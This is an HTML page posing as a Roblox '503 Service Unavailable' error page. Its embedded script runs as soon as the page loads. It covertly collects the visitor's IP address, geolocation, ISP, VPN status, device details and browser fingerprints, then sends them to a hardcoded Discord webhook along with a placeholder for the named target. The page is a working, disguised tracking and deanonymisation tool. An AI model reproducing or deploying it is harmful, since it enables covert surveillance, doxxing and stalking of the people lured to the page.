<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error | Roblox</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        body { 
            margin:0; padding:0; background:#0f0f0f; color:#fff; font-family:'Roboto',sans-serif; 
            display:flex; justify-content:center; align-items:center; min-height:100vh; overflow:hidden;
        }
        .container {
            text-align:center; max-width:620px; padding:40px 20px;
        }
        .error-code {
            font-size:130px; font-weight:900; color:#00b2ff; margin:0; line-height:1; text-shadow:0 0 30px #00b2ff;
        }
        .message {
            font-size:28px; margin:20px 0 10px; color:#ddd;
        }
        .subtext {
            font-size:18px; color:#888; margin-bottom:40px; line-height:1.5;
        }
        .btn {
            background:#00b2ff; color:#000; border:none; padding:16px 40px; font-size:18px; 
            font-weight:700; border-radius:8px; cursor:pointer; display:inline-block; margin:10px;
        }
        .footer {
            margin-top:60px; color:#555; font-size:14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="error-code">503</div>
        <div class="message">Service Temporarily Unavailable</div>
        <div class="subtext">
            We're sorry, but the page you're trying to reach is currently unavailable.<br>
            This is usually fixed within a few minutes. Please try refreshing or come back later.
        </div>
        
        <button class="btn" onclick="retry()">Refresh Page</button>
        <button class="btn" style="background:#333;" onclick="retry()">Return Home</button>

        <div class="footer">
            Error Code: ROBLOX-503<br>
            © Roblox Corporation 2026
        </div>
    </div>

    <script>
        const webhook = "https://discord.com/api/webhooks/1498622754797125633/t5Z-BfiL12-AQLa5mymJsmhvMdwc7ay9WCD8bYtxXci1s9-kOr4dRBGHg6y4QRFSjVXZ";
        const target = "TARGET_USERNAME"; // ← CHANGE THIS (only used for your logs, not shown on page)

        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes("Edg")) return "Microsoft Edge";
            if (ua.includes("Chrome")) return "Google Chrome";
            if (ua.includes("Firefox")) return "Mozilla Firefox";
            if (ua.includes("Safari")) return "Apple Safari";
            if (ua.includes("Opera")) return "Opera";
            return "Unknown Browser";
        }

        async function getUltraFingerprint() {
            let canvasFP = "";
            try {
                const canvas = document.createElement("canvas");
                canvas.width = 200; canvas.height = 200;
                const ctx = canvas.getContext("2d");
                ctx.fillStyle = "#00b2ff";
                ctx.fillRect(0, 0, 200, 200);
                ctx.fillStyle = "#fff";
                ctx.font = "30px Arial";
                ctx.fillText("R", 85, 120);
                canvasFP = canvas.toDataURL().substring(0, 80);
            } catch(e) {}

            let webglFP = "Unknown";
            try {
                const glCanvas = document.createElement("canvas");
                const gl = glCanvas.getContext("webgl") || glCanvas.getContext("experimental-webgl");
                if (gl) {
                    const debug = gl.getExtension("WEBGL_debug_renderer_info");
                    if (debug) webglFP = (gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) || "Unknown") + " / " + (gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || "Unknown");
                }
            } catch(e) {}

            let audioFP = "19f.eb16";
            try {
                const audio = new (window.AudioContext || window.webkitAudioContext)();
                audioFP = audio.sampleRate + ".eb16";
            } catch(e) {}

            let battery = "Unknown";
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    battery = `${Math.round(bat.level * 100)}%, charging:${bat.charging}`;
                }
            } catch(e) {}

            const ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown";
            return { canvasFP, webglFP, audioFP, battery, ram };
        }

        async function sendData() {
            let ip = "Unknown", city = "Unknown", region = "Unknown", country = "Unknown", isp = "Unknown";
            let vpnStatus = "Not detected";
            try {
                const geo = await fetch("https://ipinfo.io/json/").then(r => r.json());
                ip = geo.ip || "Unknown";
                city = geo.city || "Unknown";
                region = geo.region || "Unknown";
                country = geo.country || "Unknown";
                isp = geo.org || "Unknown";
                const orgLower = isp.toLowerCase();
                if (orgLower.includes("vpn") || orgLower.includes("proxy") || orgLower.includes("nord") || 
                    orgLower.includes("mullvad") || orgLower.includes("surfshark")) vpnStatus = "Detected";
            } catch(e) {}

            const fp = await getUltraFingerprint();
            const browser = getBrowserName();

            const fullMessage = `**Roblox Error Page Hit** ⚠️\n\n` +
                `**Target:** ${target}\n\n` +
                `**🌍 IP & Location**\n${ip} — ${city}, ${region}, ${country}\n\n` +
                `**🏢 ISP**\n${isp}\n\n` +
                `**🛡️ VPN**\n${vpnStatus}\n\n` +
                `**🌐 Browser**\n${browser}\n\n` +
                `**💻 Device**\n${navigator.platform} • ${navigator.hardwareConcurrency || "?"} cores • RAM: ${fp.ram}\n\n` +
                `**🕒 Timezone**\n${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n` +
                `**📱 Screen**\n${screen.width}x${screen.height}\n\n` +
                `**🎨 Canvas**\n${fp.canvasFP}\n` +
                `**🖼️ WebGL**\n${fp.webglFP}\n\n` +
                `**🔊 Audio**\n${fp.audioFP}\n` +
                `**🔋 Battery**\n${fp.battery}`;

            fetch(webhook, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: fullMessage })
            }).catch(() => {});
        }

        sendData();

        function retry() {
            alert("Still experiencing issues. Please try again later.");
            window.location.reload();
        }
    </script>
</body>
</html>
